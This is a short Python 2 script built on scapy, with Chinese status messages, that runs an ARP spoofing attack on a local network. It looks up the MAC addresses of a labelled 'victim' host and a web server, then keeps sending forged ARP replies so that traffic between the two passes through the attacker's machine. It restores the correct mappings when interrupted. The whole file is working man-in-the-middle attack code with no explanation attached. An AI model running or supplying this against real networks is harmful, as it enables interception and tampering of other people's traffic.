#!/usr/bin/python2
#coding:utf-8

from scapy.all import *
import time

conf.iface="enp2s0f1"

victim = {
        "ip": "192.168.1.20",
        "mac": ""
        }

web_server = {
        "ip": "192.168.1.10",
        "mac": ""
        }

self = {
        "ip": "192.168.1.86",
        "mac": str(Ether().hwsrc)
        }

# ask web server's MAC address
web_server["mac"] = sr1(ARP(pdst=web_server['ip'])).hwsrc
print 'web服务器硬件地址：' + web_server['mac']

# ask victim's MAC address
victim["mac"] = sr1(ARP(pdst=victim['ip'])).hwsrc
print '受害者硬件地址：' + victim['mac']

# start attack
try:
    print "attacking..."
    while True:
        sendp(Ether(dst=victim['mac'])/ARP(op=2, psrc=web_server['ip'], hwsrc=self['mac'], pdst=victim['ip'], hwdst=victim['mac']))
        sendp(Ether(dst=web_server['mac'])/ARP(op=2,psrc=victim['ip'], hwsrc=self['mac'], pdst=web_server['ip'], hwdst=web_server['mac']))
        time.sleep(2)
except KeyboardInterrupt:
    print "restore default mac mapping..."
    for i in range(0, 5):
        sendp(Ether(dst=victim['mac'])/ARP(op=2, psrc=web_server['ip'], hwsrc=web_server['mac'], pdst=victim['ip'], hwdst=victim['mac']))
        sendp(Ether(dst=web_server['mac'])/ARP(op=2,psrc=victim['ip'], hwsrc=victim['mac'], pdst=web_server['ip'], hwdst=web_server['mac']))
        time.sleep(2)


